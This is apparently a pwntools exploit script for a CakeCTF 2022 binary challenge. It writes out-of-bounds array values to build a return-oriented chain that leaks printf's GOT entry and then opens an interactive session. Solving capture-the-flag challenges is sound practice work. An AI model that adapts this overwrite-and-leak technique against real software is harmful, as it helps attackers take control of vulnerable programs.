from pwn import *

elf_file = FILENAME = 'chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log

'''
HOST = 'pwn1.2022.cakectf.com'
POST = 9003
'''
HOST = 'localhost'
POST = 7777

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    c = remote(HOST, POST)
else:
    c = process(FILENAME)

#printf 0x404020
c.sendlineafter('size:','5')
c.sendlineafter('index:','4')
c.sendlineafter('value:','1111')


c.sendlineafter('index:','9')
c.sendlineafter('value:',str(0x004013e3))

c.sendlineafter('index:','10')
c.sendlineafter('value:',str(0x404020))#got

c.sendlineafter('index:','11')
c.sendlineafter('value:',str(0x401090))
#18446603336225415871
c.interactive()